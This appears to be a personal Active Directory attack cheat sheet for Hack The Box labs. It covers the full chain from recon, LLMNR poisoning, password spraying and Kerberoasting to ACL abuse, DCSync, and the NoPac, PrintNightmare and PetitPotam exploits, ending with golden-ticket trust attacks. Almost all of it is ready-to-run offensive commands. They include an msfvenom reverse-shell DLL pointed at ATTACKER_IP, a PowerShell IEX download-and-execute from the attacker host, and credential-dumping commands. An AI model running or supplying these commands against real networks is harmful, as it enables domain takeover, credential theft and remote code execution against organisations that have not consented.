# Active Directory — HTB Attack Notes


---

## Table of Contents
1. [Phase 0 — Initial Recon (Unauthenticated)](#phase-0)
2. [Phase 1 — LLMNR / NBT-NS Poisoning](#phase-1)
3. [Phase 2 — Password Policy & Spraying](#phase-2)
4. [Phase 3 — Security Controls Check](#phase-3)
5. [Phase 4 — Credentialed Enumeration](#phase-4)
6. [Phase 5 — BloodHound](#phase-5)
7. [Phase 6 — Living Off the Land (LOTL)](#phase-6)
8. [Phase 7 — Kerberoasting](#phase-7)
9. [Phase 8 — ASREPRoasting](#phase-8)
10. [Phase 9 — ACL Abuse](#phase-9)
11. [Phase 10 — DCSync](#phase-10)
12. [Phase 11 — Privileged Access / Lateral Movement](#phase-11)
13. [Phase 12 — CVEs (NoPac / PrintNightmare / PetitPotam)](#phase-12)
14. [Phase 13 — Misconfigurations (GPP / DNS / SYSVOL)](#phase-13)
15. [Phase 14 — Trust Attacks (Child→Parent / Cross-Forest)](#phase-14)
16. [File Transfer Cheatsheet](#file-transfer)
17. [Quick Hash Cracking Reference](#cracking)

---

## Phase 0 — Initial Recon (Unauthenticated) <a name="phase-0"></a>

### Goal: discover hosts, DC, domain name before having any creds.

```bash
# Passive: identify domain name via DNS
nslookup ns1.TARGET.LOCAL

# Passive: sniff traffic to spot hostnames, hashes, and protocols
sudo tcpdump -i eth0

# Passive: Responder in analysis-only mode (NO poisoning yet)
sudo responder -I eth0 -A

# Active: ping sweep to map live hosts
fping -asgq 172.16.5.0/23

# Active: thorough nmap on discovered hosts
sudo nmap -v -A -iL hosts.txt -oN host-enum.txt
```

**What to extract:**
- Domain name (e.g., `INLANEFREIGHT.LOCAL`)
- DC IP
- Live hosts list → feed to credentialed enum later

---

## Phase 1 — LLMNR / NBT-NS Poisoning <a name="phase-1"></a>

### Goal: capture NTLMv2 hashes from broadcast name resolution.

#### Linux (Responder)
```bash
# View options
responder -h

# Start full poisoning (do NOT use -A here)
sudo responder -I eth0 -wrf
```

#### Windows (Inveigh — use when you land on a Windows box)
```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters            # review options

# Start poisoning with output
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# C# version (no PS dependency)
.\Inveigh.exe
```

#### Crack captured hashes
```bash
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Disable NBT-NS (defensive / cleanup)
```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach {
    Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose
}
```

> **HTB tip:** Responder hashes are your fastest first-cred path. Always start this in the background.

---

## Phase 2 — Password Policy & Spraying <a name="phase-2"></a>

### Step 1: Enumerate password policy (know lockout threshold before spraying)

```bash
# Null session via SMB
rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo

# enum4linux
enum4linux -P 172.16.5.5
enum4linux-ng -P 172.16.5.5 -oA ilfreight          # saves YAML+JSON

# LDAP
ldapsearch -h 172.16.5.5 -x -b "DC=TARGET,DC=LOCAL" -s sub "*" \
  | grep -m 1 -B 10 pwdHistoryLength

# CME with valid creds
crackmapexec smb 172.16.5.5 -u USER -p PASS --pass-pol

# Windows
net accounts
Get-DomainPolicy                                    # PowerView
```

### Step 2: Build username list

```bash
# Null session
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
rpcclient -U "" -N 172.16.5.5 → enumdomusers

# CME
crackmapexec smb 172.16.5.5 --users

# LDAP
ldapsearch -h 172.16.5.5 -x -b "DC=TARGET,DC=LOCAL" -s sub \
  "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

# windapsearch (Python)
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

# Kerbrute user enum (validates against Kerberos — no lockout risk)
./kerbrute_linux_amd64 userenum -d TARGET.LOCAL --dc 172.16.5.5 \
  jsmith.txt -o kerb-results
```

> **Note:** Kerbrute userenum does NOT trigger bad-password counters — safe to run.

### Step 3: Password spraying

```bash
# rpcclient one-liner
for u in $(cat valid_users.txt); do
  rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
done

# Kerbrute (Kerberos spray — preferred, lower noise)
kerbrute passwordspray -d TARGET.LOCAL --dc 172.16.5.5 \
  valid_users.txt Welcome1

# CME spray + filter hits
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# CME local admin spray across subnet (--local-auth)
sudo crackmapexec smb --local-auth 172.16.5.0/24 \
  -u administrator -H <NTLM_HASH> | grep +
```

```powershell
# Windows
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

> **Rule:** Spray max 1 attempt per user per lockout window. Check `Observation Window` from policy before each wave.

---

## Phase 3 — Security Controls Check <a name="phase-3"></a>

```powershell
# Windows Defender status
Get-MpComputerStatus

# AppLocker policies
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# PowerShell language mode (Full vs. Constrained)
$ExecutionContext.SessionState.LanguageMode

# LAPS — check delegation
Find-LAPSDelegatedGroups                             # LAPSToolkit
Find-AdmPwdExtendedRights                           # who can read LAPS passwords
Get-LAPSComputers                                   # computers with LAPS + passwords
```

> **HTB tip:** If `LanguageMode = ConstrainedLanguage`, PowerView will partially fail. Switch to .NET calls or use C# tools (Rubeus, SharpHound, etc.).

---

## Phase 4 — Credentialed Enumeration <a name="phase-4"></a>

### From Linux (CME + Impacket)

```bash
# Connect via RDP to pivot
xfreerdp /u:USER@TARGET.LOCAL /p:PASS /v:172.16.5.25

# CME — users, groups, logged-on, shares
crackmapexec smb 172.16.5.5 -u USER -p PASS --users
crackmapexec smb 172.16.5.5 -u USER -p PASS --groups
crackmapexec smb 172.16.5.125 -u USER -p PASS --loggedon-users
crackmapexec smb 172.16.5.5 -u USER -p PASS --shares
crackmapexec smb 172.16.5.5 -u USER -p PASS -M spider_plus --share Dev-share

# SMBMap — list shares + permissions + recursive SYSVOL
smbmap -u USER -p PASS -d TARGET.LOCAL -H 172.16.5.5
smbmap -u USER -p PASS -d TARGET.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only

# rpcclient — query specific user by RID
rpcclient -U "USER%PASS" 172.16.5.5
rpcclient $> queryuser 0x457
rpcclient $> enumdomusers

# Impacket — remote shells
psexec.py TARGET.LOCAL/USER:'PASS'@172.16.5.125    # via ADMIN$
wmiexec.py TARGET.LOCAL/USER:'PASS'@172.16.5.5     # via WMI

# windapsearch — domain admins + privileged users
python3 windapsearch.py --dc-ip 172.16.5.5 -u "TARGET\USER" -p PASS --da
python3 windapsearch.py --dc-ip 172.16.5.5 -u "TARGET\USER" -p PASS -PU
```

### From Windows (PowerView)

```powershell
Import-Module .\PowerView.ps1

# Users / Groups / Computers
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
Get-DomainOU
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# High-value targets
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName  # SPN users → Kerberoast
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select samaccountname,useraccountcontrol

# GPO / Policy
Get-DomainGPO
Get-DomainPolicy

# Network shares & file hunting
Get-NetShare
Find-DomainShare
Find-InterestingDomainShareFile                    # keyword search across readable shares
Get-DomainFileServer

# Sessions & admin access
Get-NetSession
Test-AdminAccess                                   # am I local admin here?
Find-LocalAdminAccess                              # where am I local admin in the domain?
Find-DomainUserLocation                            # where are privileged users logged in?

# ACLs — find writable objects
Find-InterestingDomainAcl                          # non-default write rights
```

```powershell
# Snaffler — find juicy files in shares fast
.\Snaffler.exe -d TARGET.LOCAL -s -v data
```

---

## Phase 5 — BloodHound <a name="phase-5"></a>

```bash
# Collect from Linux (bloodhound-python)
sudo bloodhound-python -u 'USER' -p 'PASS' -ns 172.16.5.5 \
  -d TARGET.LOCAL -c all

# Zip and upload to GUI
zip -r target_bh.zip *.json

# Collect for multiple domains / forests
bloodhound-python -d TARGET.LOCAL -dc ACADEMY-EA-DC01 \
  -c All -u USER -p PASS
```

**Key BloodHound queries to run first:**
- `Shortest Paths to Domain Admins`
- `Find Principals with DCSync Rights`
- `Shortest Paths from Owned Principals`
- `Kerberoastable Accounts`
- `ASREProastable Accounts`
- `Computers Where Domain Users are Local Admin`

---

## Phase 6 — Living Off the Land (LOTL) <a name="phase-6"></a>

```powershell
# AD module (built-in, no tools needed)
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"

# Enumerate available modules
Get-Module
```

> **Use when:** you land on a box without internet, can't drop tools, or AppLocker blocks script hosts.

---

## Phase 7 — Kerberoasting <a name="phase-7"></a>

### Linux (Impacket)

```bash
# List SPNs only
GetUserSPNs.py -dc-ip 172.16.5.5 TARGET.LOCAL/USER

# Request all TGS tickets
GetUserSPNs.py -dc-ip 172.16.5.5 TARGET.LOCAL/USER -request

# Request specific user
GetUserSPNs.py -dc-ip 172.16.5.5 TARGET.LOCAL/USER \
  -request-user sqldev -outputfile sqldev_tgs

# Crack
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force

# Cross-forest Kerberoast
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL \
  INLANEFREIGHT.LOCAL/USER
```

### Windows (Rubeus — preferred, more control)

```powershell
# Stats first — encryption types matter (RC4 = easier to crack)
.\Rubeus.exe kerberoast /stats

# Target high-value accounts (adminCount=1)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Target specific user
.\Rubeus.exe kerberoast /user:testspn /nowrap

# Check encryption type (RC4 vs AES)
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

### Windows (PowerView + manual)

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname

# Request + format for hashcat
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Export all to CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
```

### Windows (Mimikatz + base64 export — last resort)

```powershell
# Get SPNs via setspn
setspn.exe -Q */*

# Request ticket via .NET
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken \
  -ArgumentList "MSSQLSvc/DEV-PRE-SQL.TARGET.LOCAL:1433"

# Extract from memory
mimikatz # base64 /out:true
mimikatz # kerberos::list /export

# Convert on Linux
echo "<base64blob>" | tr -d \\n | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi
hashcat -m 13100 crack_file /usr/share/wordlists/rockyou.txt
```

> **Priority:** RC4 tickets crack in hours. AES-256 only = much harder. Downgrade by requesting with `/enctype:rc4` if possible.

---

## Phase 8 — ASREPRoasting <a name="phase-8"></a>

```powershell
# Find accounts with Kerberos pre-auth disabled
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol

# Roast with Rubeus
.\Rubeus.exe asreproast /user:USER /nowrap /format:hashcat
```

```bash
# Kerbrute also auto-roasts while enumerating
kerbrute userenum -d TARGET.LOCAL --dc 172.16.5.5 /opt/jsmith.txt

# Crack
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Phase 9 — ACL Abuse <a name="phase-9"></a>

### Enumerate

```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid USERNAME

# All objects this user has rights over
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# With resolved GUIDs (human-readable)
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Find all non-default ACLs
Find-InterestingDomainAcl

# Map GUID to right name
$guid = "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" \
  -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | \
  Select Name,DisplayName,DistinguishedName,rightsGuid | ? {$_.rightsGuid -eq $guid}

# Enumerate ACLs for all domain users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
    get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | \
    Where-Object {$_.IdentityReference -match 'TARGET\\USER'}
}
```

### Exploit — ForceChangePassword chain example

```powershell
# Step 1: Create PSCredential object for your current user
$SecPassword = ConvertTo-SecureString 'MYPASS' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TARGET\myuser', $SecPassword)

# Step 2: Change victim's password (if you have ForceChangePassword)
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword \
  -Credential $Cred -Verbose

# Step 3: Add user to group (if you have GenericWrite / AddMember)
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' \
  -Credential $Cred2 -Verbose

# Step 4: Verify membership
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# Step 5: Fake SPN on target user (for targeted Kerberoast via WriteSPN)
Set-DomainObject -Credential $Cred2 -Identity adunn \
  -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# Step 6: Clean up SPN after roasting
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

# Step 7: Remove yourself from group (clean up)
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' \
  -Credential $Cred2 -Verbose
```

> **Common exploitable rights:** `ForceChangePassword`, `GenericWrite`, `GenericAll`, `WriteOwner`, `WriteDACL`, `AddMember`, `Replication-Get` (DCSync).

---

## Phase 10 — DCSync <a name="phase-10"></a>

### Check replication rights

```powershell
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol

$sid = "S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-XXXX"
Get-ObjectAcl "DC=TARGET,DC=LOCAL" -ResolveGUIDs | \
  ? { ($_.ObjectAceType -match 'Replication-Get') } | \
  ? { $_.SecurityIdentifier -match $sid } | \
  select AceQualifier,ObjectDN,ActiveDirectoryRights,SecurityIdentifier,ObjectAceType
```

### Execute DCSync

```bash
# Linux (Impacket) — dump all hashes
secretsdump.py -outputfile target_hashes -just-dc TARGET/USER@172.16.5.5

# Linux — VSS method (bypasses hook detection)
secretsdump.py -outputfile target_hashes -just-dc TARGET/USER@172.16.5.5 -use-vss
```

```powershell
# Windows (Mimikatz)
mimikatz # lsadump::dcsync /domain:TARGET.LOCAL /user:TARGET\administrator
mimikatz # lsadump::dcsync /user:TARGET\krbtgt
```

---

## Phase 11 — Privileged Access / Lateral Movement <a name="phase-11"></a>

### Identify remote access paths

```powershell
# Who can RDP?
Get-NetLocalGroupMember -ComputerName TARGET-HOST -GroupName "Remote Desktop Users"

# Who can WinRM?
Get-NetLocalGroupMember -ComputerName TARGET-HOST -GroupName "Remote Management Users"
```

### WinRM / PSSession

```bash
# Linux → Windows via WinRM
evil-winrm -i 10.129.201.234 -u USER -p PASS
```

```powershell
# Windows → Windows via PSSession
$password = ConvertTo-SecureString "PASS" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("TARGET\USER", $password)
Enter-PSSession -ComputerName TARGET-HOST -Credential $cred
```

### MSSQL Abuse (lateral movement via DB)

```bash
# Linux
mssqlclient.py TARGET/USER@172.16.5.150 -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
```

```powershell
# Windows (PowerUpSQL)
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain                              # find SQL instances
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" \
  -username "TARGET\USER" -password "PASS" -query 'Select @@version'
```

---

## Phase 12 — CVEs <a name="phase-12"></a>

### NoPac / Sam_The_Admin (CVE-2021-42278 + CVE-2021-42287)

```bash
# Check if vulnerable
sudo python3 scanner.py TARGET.LOCAL/USER:PASS -dc-ip 172.16.5.5 -use-ldap

# Exploit → SYSTEM shell
sudo python3 noPac.py TARGET.LOCAL/USER:PASS -dc-ip 172.16.5.5 \
  -dc-host DC01 -shell --impersonate administrator -use-ldap

# Exploit → DCSync (dump krbtgt/admin hash directly)
sudo python3 noPac.py TARGET.LOCAL/USER:PASS -dc-ip 172.16.5.5 \
  -dc-host DC01 --impersonate administrator -use-ldap \
  -dump -just-dc-user TARGET/administrator
```

> Requires: any valid domain user account. Machine account quota must be > 0.

---

### PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

```bash
# Check if vulnerable
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# Generate DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=8080 \
  -f dll > backupscript.dll

# Host DLL via SMB
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# Trigger exploit
sudo python3 CVE-2021-1675.py TARGET.LOCAL/USER:PASS@172.16.5.5 \
  '\\ATTACKER_IP\CompData\backupscript.dll'
```

---

### PetitPotam + AD CS (ESC8)

```bash
# Step 1: Set up NTLM relay → AD CS web enrollment
sudo ntlmrelayx.py -debug -smb2support \
  --target http://ADCS-HOST.TARGET.LOCAL/certsrv/certfnsh.asp \
  --adcs --template DomainController

# Step 2: Trigger DC auth via PetitPotam
python3 PetitPotam.py ATTACKER_IP 172.16.5.5

# Step 3: Use captured certificate to get TGT
python3 /opt/PKINITtools/gettgtpkinit.py \
  TARGET.LOCAL/DC01$ -pfx-base64 <base64cert> dc01.ccache

# Step 4: Get NT hash from TGT
python3 /opt/PKINITtools/getnthash.py -key <session_key> TARGET.LOCAL/DC01$

# Step 5: DCSync using machine account hash
secretsdump.py -just-dc-user TARGET/administrator \
  "DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:<NTLM_HASH>

# Pass-the-ticket (Rubeus)
.\Rubeus.exe asktgt /user:DC01$ /<base64cert>= /ptt
mimikatz # lsadump::dcsync /user:TARGET\krbtgt

# Verify ticket
klist
```

---

## Phase 13 — Misconfigurations <a name="phase-13"></a>

### Group Policy Preferences (GPP) — cached credentials in SYSVOL

```bash
# Decrypt captured GPP password
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

# Auto-find GPP passwords via CME
crackmapexec smb -L | grep gpp
crackmapexec smb 172.16.5.5 -u USER -p PASS -M gpp_autologin

# Manual SYSVOL browse
ls \\DC01\SYSVOL\TARGET.LOCAL\scripts
```

### Descriptions field leaks

```powershell
Get-DomainUser * | Select-Object samaccountname,description
```

### PASSWD_NOTREQD — accounts with no password required

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### DNS enumeration (adidnsdump)

```bash
# Dump all DNS records via LDAP (reveals internal IPs)
adidnsdump -u TARGET\\USER ldap://172.16.5.5
adidnsdump -u TARGET\\USER ldap://172.16.5.5 -r   # resolve unknown records
```

### GPO abuse

```powershell
# List GPOs
Get-DomainGPO | select displayname
Get-GPO -All | Select DisplayName

# Check if Domain Users have GPO write rights
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}

# Get GPO name by GUID
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

### MS-PRN Printer Bug (Spooler check)

```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName DC01.TARGET.LOCAL
```

---

## Phase 14 — Trust Attacks <a name="phase-14"></a>

### Map trusts

```powershell
Get-ADTrust -Filter *
Get-DomainTrust
Get-DomainTrustMapping
Get-ForestTrust
Get-DomainForeignUser             # users in foreign group memberships
Get-DomainForeignGroupMember      # foreign members in local groups
```

### Child → Parent (Golden Ticket with SID history)

```powershell
# Step 1: Get child domain KRBTGT hash
mimikatz # lsadump::dcsync /user:CHILD\krbtgt

# Step 2: Get child domain SID
Get-DomainSID                    # from child domain

# Step 3: Get parent Enterprise Admins SID
Get-DomainGroup -Domain PARENT.LOCAL -Identity "Enterprise Admins" | \
  select distinguishedname,objectsid

# Step 4: Forge golden ticket (add /sids for EA group in parent)
mimikatz # kerberos::golden /user:hacker \
  /domain:CHILD.PARENT.LOCAL \
  /sid:S-1-5-21-CHILD-SID \
  /krbtgt:KRBTGT_HASH \
  /sids:S-1-5-21-PARENT-SID-519 /ptt    # 519 = Enterprise Admins RID

# Rubeus version
.\Rubeus.exe golden /rc4:KRBTGT_HASH \
  /domain:CHILD.PARENT.LOCAL \
  /sid:S-1-5-21-CHILD-SID \
  /sids:S-1-5-21-PARENT-SID-519 \
  /user:hacker /ptt

# Step 5: Verify access to parent DC
ls \\PARENT-DC.parent.local\c$
```

#### Linux equivalent (Impacket)

```bash
# Get child KRBTGT hash
secretsdump.py CHILD.PARENT.LOCAL/USER@CHILD_DC_IP -just-dc-user CHILD/krbtgt

# Resolve SIDs
lookupsid.py CHILD.PARENT.LOCAL/USER@CHILD_DC_IP
lookupsid.py CHILD.PARENT.LOCAL/USER@CHILD_DC_IP | grep "Domain SID"
lookupsid.py CHILD.PARENT.LOCAL/USER@PARENT_DC_IP | grep -B12 "Enterprise Admins"

# Forge ticket
ticketer.py -nthash KRBTGT_HASH \
  -domain CHILD.PARENT.LOCAL \
  -domain-sid S-1-5-21-CHILD-SID \
  -extra-sid S-1-5-21-PARENT-SID-519 hacker

# Use ticket
export KRB5CCNAME=hacker.ccache
psexec.py CHILD.PARENT.LOCAL/hacker@PARENT-DC.parent.local -k -no-pass -target-ip PARENT_DC_IP

# Auto-pwn child→parent in one shot
raiseChild.py -target-exec PARENT_DC_IP CHILD.PARENT.LOCAL/USER
```

### Cross-Forest Trust Kerberoasting

```powershell
# Find SPNs in trusted forest
Get-DomainUser -SPN -Domain TRUSTED.LOCAL | select SamAccountName
Get-DomainUser -Domain TRUSTED.LOCAL -Identity mssqlsvc | select samaccountname,memberof

# Roast
.\Rubeus.exe kerberoast /domain:TRUSTED.LOCAL /user:mssqlsvc /nowrap
```

```bash
# Linux
GetUserSPNs.py -request -target-domain TRUSTED.LOCAL \
  SOURCE.LOCAL/USER
```

### Cross-Forest foreign group members

```powershell
Get-DomainForeignGroupMember -Domain TRUSTED.LOCAL
Enter-PSSession -ComputerName TRUSTED-DC.TRUSTED.LOCAL \
  -Credential SOURCE\administrator
```

---

## File Transfer Cheatsheet <a name="file-transfer"></a>

```bash
# Linux HTTP server
sudo python3 -m http.server 8001

# Linux SMB server
impacket-smbserver -ip ATTACKER_IP -smb2support -username user -password password \
  shared /home/administrator/Downloads/
```

```powershell
# Windows download from HTTP
IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP:8001/SharpHound.exe')

# Windows download and save
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8001/tool.exe', 'C:\Temp\tool.exe')
```

---

## Quick Hash Cracking Reference <a name="cracking"></a>

| Hash Type | Mode | Example |
|-----------|------|---------|
| NTLMv2 (Responder) | 5600 | `hashcat -m 5600 hash.txt rockyou.txt` |
| Kerberoast (RC4) | 13100 | `hashcat -m 13100 tgs.txt rockyou.txt` |
| Kerberoast (AES256) | 19700 | `hashcat -m 19700 tgs.txt rockyou.txt` |
| ASREPRoast | 18200 | `hashcat -m 18200 asrep.txt rockyou.txt` |
| NTLM | 1000 | `hashcat -m 1000 ntlm.txt rockyou.txt` |
| NetNTLMv1 | 5500 | `hashcat -m 5500 hash.txt rockyou.txt` |

**Rules to append for weak passwords:**
```bash
hashcat -m 13100 tgs.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## Quick Tool Cheatsheet

| Goal | Tool |
|------|------|
| Capture hashes (Linux) | `responder` |
| Capture hashes (Windows) | `Inveigh` |
| Spray / enumerate | `crackmapexec`, `kerbrute` |
| Domain enumeration | `PowerView`, `BloodHound` |
| Kerberoast | `Rubeus`, `GetUserSPNs.py` |
| ASREPRoast | `Rubeus`, `kerbrute` |
| Remote shells | `evil-winrm`, `psexec.py`, `wmiexec.py` |
| DCSync | `secretsdump.py`, `mimikatz` |
| Golden Ticket | `mimikatz`, `Rubeus`, `ticketer.py` |
| Share hunting | `Snaffler`, `spider_plus (CME)` |
| DNS recon | `adidnsdump` |
| SQL abuse | `mssqlclient.py`, `PowerUpSQL` |
| NoPac | `noPac.py` + `scanner.py` |
| PrintNightmare | `CVE-2021-1675.py` |
| PetitPotam | `PetitPotam.py` + `ntlmrelayx.py` |
